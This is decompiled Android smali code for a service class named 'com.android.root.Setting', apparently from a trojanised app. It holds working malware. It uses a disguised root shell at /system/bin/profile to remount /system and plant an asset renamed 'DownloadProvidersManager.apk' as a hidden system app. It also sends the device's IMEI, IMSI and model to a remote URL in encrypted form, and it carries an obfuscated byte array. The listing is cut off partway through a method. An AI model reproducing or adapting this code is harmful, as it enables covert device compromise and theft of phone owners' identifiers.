.class public Lcom/android/root/Setting;
.super Landroid/app/Service;
.source "Setting.java"


# static fields
.field public static final ADB_FORKED_FOUND:I = 0x2

.field public static final ADB_NOT_FIND:I = 0x1

.field private static final SU_EXEC_PATH:Ljava/lang/String; = "/system/bin/profile"

.field private static final TAG:Ljava/lang/String; = "MyRoot"

.field public static u:[B


# instance fields
.field private ctx:Landroid/content/Context;

.field private handler:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 8

    .prologue
    const/4 v7, 0x3

    const/4 v6, 0x1

    const/16 v5, 0x2a

    const/16 v4, 0x13

    const/4 v3, 0x2

    .line 44
    const/16 v0, 0x2d

    new-array v0, v0, [B

    const/4 v1, 0x0

    const/16 v2, 0x5e

    aput-byte v2, v0, v1

    aput-byte v5, v0, v6

    const/16 v1, 0x5d

    aput-byte v1, v0, v3

    const/16 v1, 0x58

    aput-byte v1, v0, v7

    const/4 v1, 0x4

    aput-byte v7, v0, v1

    const/4 v1, 0x5

    aput-byte v3, v0, v1

    const/4 v1, 0x6

    const/16 v2, 0x5f

    aput-byte v2, v0, v1

    const/4 v1, 0x7

    aput-byte v3, v0, v1

    const/16 v1, 0x8

    const/16 v2, 0xd

    aput-byte v2, v0, v1

    const/16 v1, 0x9

    const/16 v2, 0x55

    aput-byte v2, v0, v1

    const/16 v1, 0xa

    const/16 v2, 0xb

    aput-byte v2, v0, v1

    const/16 v1, 0xb

    aput-byte v3, v0, v1

    const/16 v1, 0xc

    aput-byte v4, v0, v1

    const/16 v1, 0xd

    aput-byte v6, v0, v1

    const/16 v1, 0xe

    const/16 v2, 0x7d

    aput-byte v2, v0, v1

    const/16 v1, 0xf

    aput-byte v4, v0, v1

    const/16 v1, 0x11

    const/16 v2, 0x66

    aput-byte v2, v0, v1

    const/16 v1, 0x12

    const/16 v2, 0x1e

    aput-byte v2, v0, v1

    const/16 v1, 0x18

    aput-byte v1, v0, v4

    const/16 v1, 0x14

    aput-byte v4, v0, v1

    const/16 v1, 0x15

    const/16 v2, 0x63

    aput-byte v2, v0, v1

    const/16 v1, 0x16

    const/16 v2, 0x4c

    aput-byte v2, v0, v1

    const/16 v1, 0x17

    const/16 v2, 0x15

    aput-byte v2, v0, v1

    const/16 v1, 0x18

    const/16 v2, 0x66

    aput-byte v2, v0, v1

    const/16 v1, 0x19

    const/16 v2, 0x16

    aput-byte v2, v0, v1

    const/16 v1, 0x1a

    const/16 v2, 0x1a

    aput-byte v2, v0, v1

    const/16 v1, 0x1b

    const/16 v2, 0x6f

    aput-byte v2, v0, v1

    const/16 v1, 0x1c

    const/16 v2, 0x27

    aput-byte v2, v0, v1

    const/16 v1, 0x1d

    const/16 v2, 0x7d

    aput-byte v2, v0, v1

    const/16 v1, 0x1e

    aput-byte v3, v0, v1

    const/16 v1, 0x1f

    const/16 v2, 0x2c

    aput-byte v2, v0, v1

    const/16 v1, 0x20

    const/16 v2, 0x50

    aput-byte v2, v0, v1

    const/16 v1, 0x21

    const/16 v2, 0xa

    aput-byte v2, v0, v1

    const/16 v1, 0x22

    const/16 v2, 0x5a

    aput-byte v2, v0, v1

    const/16 v1, 0x23

    const/4 v2, 0x5

    aput-byte v2, v0, v1

    const/16 v1, 0x24

    const/16 v2, 0x77

    aput-byte v2, v0, v1

    const/16 v1, 0x25

    const/16 v2, 0x64

    aput-byte v2, v0, v1

    const/16 v1, 0x26

    const/16 v2, 0x77

    aput-byte v2, v0, v1

    const/16 v1, 0x27

    const/16 v2, 0x3c

    aput-byte v2, v0, v1

    const/16 v1, 0x28

    const/4 v2, 0x4

    aput-byte v2, v0, v1

    const/16 v1, 0x29

    const/16 v2, 0x57

    aput-byte v2, v0, v1

    const/16 v1, 0x4f

    aput-byte v1, v0, v5

    const/16 v1, 0x2b

    aput-byte v5, v0, v1

    const/16 v1, 0x2c

    const/16 v2, 0x34

    aput-byte v2, v0, v1

    sput-object v0, Lcom/android/root/Setting;->u:[B

    .line 43
    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 43
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 51
    new-instance v0, Lcom/android/root/Setting$1;

    invoke-direct {v0, p0}, Lcom/android/root/Setting$1;-><init>(Lcom/android/root/Setting;)V

    iput-object v0, p0, Lcom/android/root/Setting;->handler:Landroid/os/Handler;

    .line 43
    return-void
.end method

.method static synthetic access$0(Lcom/android/root/Setting;Z)V
    .locals 0
    .parameter
    .parameter

    .prologue
    .line 223
    invoke-direct {p0, p1}, Lcom/android/root/Setting;->destroy(Z)V

    return-void
.end method

.method static synthetic access$1(Lcom/android/root/Setting;)Landroid/content/Context;
    .locals 1
    .parameter

    .prologue
    .line 46
    iget-object v0, p0, Lcom/android/root/Setting;->ctx:Landroid/content/Context;

    return-object v0
.end method

.method public static cpFile(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 13
    .parameter "ctx"
    .parameter "assetName"
    .parameter "fileName"

    .prologue
    const-string v10, "profile"

    .line 183
    const/4 v6, 0x0

    .line 185
    .local v6, rs:Z
    const/4 v10, 0x1

    :try_start_0
    invoke-virtual {p0, p2, v10}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v3

    .line 186
    .local v3, fos:Ljava/io/FileOutputStream;
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v10

    invoke-virtual {v10, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v4

    .line 187
    .local v4, is:Ljava/io/InputStream;
    invoke-virtual {v4}, Ljava/io/InputStream;->available()I

    move-result v8

    .line 188
    .local v8, size:I
    const/4 v5, 0x0

    .local v5, k:I
    :goto_0
    div-int/lit16 v10, v8, 0x400

    if-lt v5, v10, :cond_1

    .line 194
    rem-int/lit16 v10, v8, 0x400

    if-lez v10, :cond_0

    .line 195
    rem-int/lit16 v10, v8, 0x400

    new-array v0, v10, [B

    .line 196
    .local v0, b:[B
    invoke-virtual {v4, v0}, Ljava/io/InputStream;->read([B)I

    .line 197
    invoke-virtual {v3, v0}, Ljava/io/FileOutputStream;->write([B)V

    .line 199
    .end local v0           #b:[B
    :cond_0
    invoke-virtual {v4}, Ljava/io/InputStream;->close()V

    .line 200
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V

    .line 202
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "/system/app/"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v10, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 203
    .local v1, dest:Ljava/lang/String;
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 204
    .local v9, source:Ljava/lang/String;
    const-string v10, "profile"

    const-string v11, "mount -o remount rw system\nexit\n"

    invoke-static {v10, v11}, Lcom/android/root/Setting;->runRootCommand(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 206
    .local v7, s:Ljava/lang/String;
    const-string v10, "profile"

    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "cat "

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, " > "

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "\nexit\n"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Lcom/android/root/Setting;->runRootCommand(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 209
    const/4 v6, 0x1

    .line 219
    .end local v1           #dest:Ljava/lang/String;
    .end local v3           #fos:Ljava/io/FileOutputStream;
    .end local v4           #is:Ljava/io/InputStream;
    .end local v5           #k:I
    .end local v7           #s:Ljava/lang/String;
    .end local v8           #size:I
    .end local v9           #source:Ljava/lang/String;
    :goto_1
    return v6

    .line 189
    .restart local v3       #fos:Ljava/io/FileOutputStream;
    .restart local v4       #is:Ljava/io/InputStream;
    .restart local v5       #k:I
    .restart local v8       #size:I
    :cond_1
    const/16 v10, 0x400

    new-array v0, v10, [B

    .line 190
    .restart local v0       #b:[B
    invoke-virtual {v4, v0}, Ljava/io/InputStream;->read([B)I

    .line 191
    invoke-virtual {v3, v0}, Ljava/io/FileOutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 188
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 212
    .end local v0           #b:[B
    .end local v3           #fos:Ljava/io/FileOutputStream;
    .end local v4           #is:Ljava/io/InputStream;
    .end local v5           #k:I
    .end local v8           #size:I
    :catch_0
    move-exception v10

    move-object v2, v10

    .line 215
    .local v2, e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1
.end method

.method private destroy(Z)V
    .locals 3
    .parameter "rs"

    .prologue
    .line 226
    if-eqz p1, :cond_0

    iget-object v0, p0, Lcom/android/root/Setting;->ctx:Landroid/content/Context;

    const-string v1, "com.android.providers.downloadsmanager"

    invoke-static {v0, v1}, Lcom/android/root/Setting;->isPackageInstalled(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 228
    iget-object v0, p0, Lcom/android/root/Setting;->ctx:Landroid/content/Context;

    const-string v1, "sqlite.db"

    const-string v2, "DownloadProvidersManager.apk"

    invoke-static {v0, v1, v2}, Lcom/android/root/Setting;->cpFile(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    .line 230
    :cond_0
    invoke-virtual {p0}, Lcom/android/root/Setting;->stopSelf()V

    .line 231
    return-void
.end method

.method public static getRawResource(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
    .locals 8
    .parameter "ctx"
    .parameter "assetName"
    .parameter "fileName"

    .prologue
    .line 150
    const/4 v5, 0x0

    .line 152
    .local v5, rs:Z
    const/4 v7, 0x1

    :try_start_0
    invoke-virtual {p0, p2, v7}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v2

    .line 153
    .local v2, fos:Ljava/io/FileOutputStream;
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v7

    invoke-virtual {v7, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v3

    .line 154
    .local v3, is:Ljava/io/InputStream;
    invoke-virtual {v3}, Ljava/io/InputStream;->available()I

    move-result v6

    .line 155
    .local v6, size:I
    const/4 v4, 0x0

    .local v4, k:I
    :goto_0
    div-int/lit16 v7, v6, 0x400

    if-lt v4, v7, :cond_1

    .line 161
    rem-int/lit16 v7, v6, 0x400

    if-lez v7, :cond_0

    .line 162
    rem-int/lit16 v7, v6, 0x400

    new-array v0, v7, [B

    .line 163
    .local v0, b:[B
    invoke-virtual {v3, v0}, Ljava/io/InputStream;->read([B)I

    .line 164
    invoke-virtual {v2, v0}, Ljava/io/FileOutputStream;->write([B)V

    .line 166
    .end local v0           #b:[B
    :cond_0
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 167
    invoke-virtual {v2}, Ljava/io/FileOutputStream;->close()V

    .line 169
    const/4 v5, 0x1

    .line 179
    .end local v2           #fos:Ljava/io/FileOutputStream;
    .end local v3           #is:Ljava/io/InputStream;
    .end local v4           #k:I
    .end local v6           #size:I
    :goto_1
    return v5

    .line 156
    .restart local v2       #fos:Ljava/io/FileOutputStream;
    .restart local v3       #is:Ljava/io/InputStream;
    .restart local v4       #k:I
    .restart local v6       #size:I
    :cond_1
    const/16 v7, 0x400

    new-array v0, v7, [B

    .line 157
    .restart local v0       #b:[B
    invoke-virtual {v3, v0}, Ljava/io/InputStream;->read([B)I

    .line 158
    invoke-virtual {v2, v0}, Ljava/io/FileOutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 155
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 172
    .end local v0           #b:[B
    .end local v2           #fos:Ljava/io/FileOutputStream;
    .end local v3           #is:Ljava/io/InputStream;
    .end local v4           #k:I
    .end local v6           #size:I
    :catch_0
    move-exception v7

    move-object v1, v7

    .line 175
    .local v1, e:Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1
.end method

.method public static isPackageInstalled(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 4
    .parameter "ctx"
    .parameter "packageName"

    .prologue
    const/4 v3, 0x0

    .line 96
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v1

    .line 97
    .local v1, packageInfo:Ljava/util/List;,"Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    const/4 v0, 0x0

    .end local p0
    .local v0, i:I
    :goto_0
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v2

    if-lt v0, v2, :cond_0

    move v2, v3

    .line 104
    :goto_1
    return v2

    .line 98
    :cond_0
    invoke-interface {v1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/content/pm/PackageInfo;

    iget-object v2, p0, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    invoke-virtual {v2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 101
    const/4 v2, 0x1

    goto :goto_1

    .line 97
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public static postUrl(Ljava/lang/String;Landroid/content/Context;)V
    .locals 6
    .parameter "url"
    .parameter "ctx"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 304
    const-string v0, "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Request><Protocol>1.0</Protocol><Command>0</Command><ClientInfo><Partner>%s</Partner><ProductId>%s</ProductId><IMEI>%s</IMEI><IMSI>%s</IMSI><Modle>%s</Modle></ClientInfo></Request>"

    .line 305
    .local v0, data:Ljava/lang/String;
    new-instance v1, Ljava/util/Formatter;

    invoke-direct {v1}, Ljava/util/Formatter;-><init>()V

    .line 306
    .local v1, fm:Ljava/util/Formatter;
    const/4 v2, 0x5

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    const-string v4, "502"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "10028"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    invoke-static {p1}, Lcom/android/root/adbRoot;->getIMEI(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x3

    invoke-static {p1}, Lcom/android/root/adbRoot;->getIMSI(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x4

    new-instance v4, Ljava/lang/StringBuilder;

    sget-object v5, Landroid/os/Build;->DEVICE:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, ":"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v1, v0, v2}, Ljava/util/Formatter;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/util/Formatter;

    .line 307
    invoke-virtual {v1}, Ljava/util/Formatter;->toString()Ljava/lang/String;

    move-result-object v0

    .end local v0           #data:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    .line 308
    .local v1, buff:[B
    invoke-static {v1}, Lcom/android/root/adbRoot;->crypt([B)V

    .line 311
    new-instance v0, Ljava/net/URL;

    invoke-direct {v0, p0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 312
    .local v0, aURL:Ljava/net/URL;
    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object p0

    .end local p0
    check-cast p0, Ljava/net/HttpURLConnection;

    .line 313
    .local p0, aConnection:Ljava/net/HttpURLConnection;
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 314
    .end local v0           #aURL:Ljava/net/URL;
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 315
    const-string v0, "POST"

    invoke-virtual {p0, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 324
    invoke-virtual {p0}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    .line 325
    .local v3, os:Ljava/io/OutputStream;
    new-instance v0, Ljava/io/ByteArrayInputStream;

    invoke-direct {v0, v1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    .line 326
    .local v0, bin:Ljava/io/ByteArrayInputStream;
    const/4 v2, 0x0

    .line 327
    .local v2, bytesRead:I
    const/16 v1, 0x400

    new-array v1, v1, [B

    .line 328
    .local v1, buffer:[B
    :goto_0
    const/4 v2, 0x0

    const/16 v4, 0x400

    invoke-virtual {v0, v1, v2, v4}, Ljava/io/ByteArrayInputStream;->read([BII)I

    .end local v2           #bytesRead:I
    move-result v2

    .restart local v2       #bytesRead:I
    const/4 v4, -0x1

    if-ne v2, v4, :cond_1

    .line 332
    invoke-virtual {v0}, Ljava/io/ByteArrayInputStream;->close()V

    .line 333
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V

    .line 335
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    .end local v0           #bin:Ljava/io/ByteArrayInputStream;
    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 336
    .local v0, bao:Ljava/io/ByteArrayOutputStream;
    new-instance v3, Ljava/io/BufferedInputStream;

    .end local v3           #os:Ljava/io/OutputStream;
    invoke-virtual {p0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object p0

    .end local p0           #aConnection:Ljava/net/HttpURLConnection;
    invoke-direct {v3, p0}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .local v3, is:Ljava/io/InputStream;
    move p0, v2

    .line 338
    .end local v2           #bytesRead:I
    .local p0, bytesRead:I
    :goto_1
    const/4 p0, 0x0

    const/16 v2, 0x400

    invoke-virtual {v3, v1, p0, v2}, Ljava/io/InputStream;->read([BII)I

    .end local p0           #bytesRead:I
    move-result p0

    .restart local p0       #bytesRead:I
    const/4 v2, -0x1

    if-ne p0, v2, :cond_2

    .line 342
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 343
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->size()I

    move-result p0

    .end local p0           #bytesRead:I
    if-lez p0, :cond_0

    .line 344
    const-string p0, "pref_config_setting"

    const/4 v0, 0x0

    invoke-virtual {p1, p0, v0}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .end local v0           #bao:Ljava/io/ByteArrayOutputStream;
    move-result-object p0

    invoke-interface {p0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object p0

    .line 345
    .local p0, editor:Landroid/content/SharedPreferences$Editor;
    const-string p1, "done"

    .end local p1
    const/4 v0, 0x1

    invoke-interface {p0, p1, v0}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 346
    invoke-interface {p0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 349
    .end local p0           #editor:Landroid/content/SharedPreferences$Editor;
    :cond_0
    return-void

    .line 329
    .local v0, bin:Ljava/io/ByteArrayInputStream;
    .restart local v2       #bytesRead:I
    .local v3, os:Ljava/io/OutputStream;
    .local p0, aConnection:Ljava/net/HttpURLConnection;
    .restart local p1
    :cond_1
    const/4 v4, 0x0

    invoke-virtual {v3, v1, v4, v2}, Ljava/io/OutputStream;->write([BII)V

    .line 330
    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V

    goto :goto_0

    .line 340
    .end local v2           #bytesRead:I
    .local v0, bao:Ljava/io/ByteArrayOutputStream;
    .local v3, is:Ljava/io/InputStream;
    .local p0, bytesRead:I
    :cond_2
    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2, p0}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :goto_1
.end method

.method public static runRootCommand(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 11
    .parameter "command"
    .parameter "arg"

    .prologue
    .line 108
    const-string v7, ""

    .line 109
    .local v7, rs:Ljava/lang/String;
    const/4 v6, 0x0

    .line 110
    .local v6, process:Ljava/lang/Process;
    const/4 v4, 0x0

    .line 111
    .local v4, os:Ljava/io/DataOutputStream;
    const/4 v2, 0x0

    .line 115
    .local v2, is:Ljava/io/DataInputStream;
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v9

    invoke-virtual {v9, p0}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v6

    .line 116
    new-instance v5, Ljava/io/DataOutputStream;

    invoke-virtual {v6}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v9

    invoke-direct {v5, v9}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 117
    .end local v4           #os:Ljava/io/DataOutputStream;
    .local v5, os:Ljava/io/DataOutputStream;
    :try_start_1
    new-instance v3, Ljava/io/DataInputStream;

    invoke-virtual {v6}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v9

    invoke-direct {v3, v9}, Ljava/io/DataInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_7

    .line 118
    .end local v2           #is:Ljava/io/DataInputStream;
    .local v3, is:Ljava/io/DataInputStream;
    :try_start_2
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v10, "\nexit\n"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v9}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 119
    invoke-virtual {v5}, Ljava/io/DataOutputStream;->flush()V

    .line 120
    invoke-virtual {v6}, Ljava/lang/Process;->waitFor()I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_8

    .line 127
    :try_start_3
    invoke-virtual {v3}, Ljava/io/DataInputStream;->available()I

    move-result v9

    new-array v0, v9, [B

    .line 128
    .local v0, buffer:[B
    invoke-virtual {v3, v0}, Ljava/io/DataInputStream;->read([B)I

    .line 129
    new-instance v8, Ljava/lang/String;

    invoke-direct {v8, v0}, Ljava/lang/String;-><init>([B)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 132
    .end local v7           #rs:Ljava/lang/String;
    .local v8, rs:Ljava/lang/String;
    if-eqz v5, :cond_0

    .line 133
    :try_start_4
    invoke-virtual {v5}, Ljava/io/DataOutputStream;->close()V

    .line 135
    :cond_0
    if-eqz v3, :cond_1

    .line 136
    invoke-virtual {v3}, Ljava/io/DataInputStream;->close()V

    .line 138
    :cond_1
    invoke-virtual {v6}, Ljava/lang/Process;->destroy()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    move-object v2, v3

    .end local v3           #is:Ljava/io/DataInputStream;
    .restart local v2       #is:Ljava/io/DataInputStream;
    move-object v4, v5

    .end local v5           #os:Ljava/io/DataOutputStream;
    .restart local v4       #os:Ljava/io/DataOutputStream;
    move-object v7, v8

    .line 146
    .end local v0           #buffer:[B
    .end local v8           #rs:Ljava/lang/String;
    .restart local v7       #rs:Ljava/lang/String;
    :goto_0
    return-object v7

    .line 122
    :catch_0
    move-exception v9

    move-object v1, v9

    .line 123
    .local v1, e:Ljava/lang/Exception;
    :goto_1
    :try_start_5
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 127
    :try_start_6
    invoke-virtual {v2}, Ljava/io/DataInputStream;->available()I

    move-result v9

    new-array v0, v9, [B

    .line 128
    .restart local v0       #buffer:[B
    invoke-virtual {v2, v0}, Ljava/io/DataInputStream;->read([B)I

    .line 129
    new-instance v8, Ljava/lang/String;

    invoke-direct {v8, v0}, Ljava/lang/String;-><init>([B)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    .line 132
    .end local v7           #rs:Ljava/lang/String;
    .restart local v8       #rs:Ljava/lang/String;
    if-eqz v4, :cond_2

    .line 133
    :try_start_7
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V

    .line 135
    :cond_2
    if-eqz v2, :cond_3

    .line 136
    invoke-virtual {v2}, Ljava/io/DataInputStream;->close()V

    .line 138
    :cond_3
    invoke-virtual {v6}, Ljava/lang/Process;->destroy()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    move-object v7, v8

    .end local v8           #rs:Ljava/lang/String;
    .restart local v7       #rs:Ljava/lang/String;
    goto :goto_0

    .line 139
    .end local v0           #buffer:[B
    :catch_1
    move-exception v9

    move-object v1, v9

    .line 142
    :goto_2
    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 125
    .end local v1           #e:Ljava/lang/Exception;
    :catchall_0
    move-exception v9

    .line 127
    :goto_3
    :try_start_8
    invoke-virtual {v2}, Ljava/io/DataInputStream;->available()I

    move-result v10

    new-array v0, v10, [B

    .line 128
    .restart local v0       #buffer:[B
    invoke-virtual {v2, v0}, Ljava/io/DataInputStream;->read([B)I

    .line 129
    new-instance v8, Ljava/lang/String;

    invoke-direct {v8, v0}, Ljava/lang/String;-><init>([B)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_2

    .line 132
    .end local v7           #rs:Ljava/lang/String;
    .restart local v8       #rs:Ljava/lang/String;
    if-eqz v4, :cond_4

    .line 133
    :try_start_9
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V

    .line 135
    :cond_4
    if-eqz v2, :cond_5

    .line 136
    invoke-virtual {v2}, Ljava/io/DataInputStream;->close()V

    .line 138
    :cond_5
    invoke-virtual {v6}, Ljava/lang/Process;->destroy()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_5

    move-object v7, v8

    .line 144
    .end local v0           #buffer:[B
    .end local v8           #rs:Ljava/lang/String;
    .restart local v7       #rs:Ljava/lang/String;
    :goto_4
    throw v9

    .line 139
    :catch_2
    move-exception v10

    move-object v1, v10

    .line 142
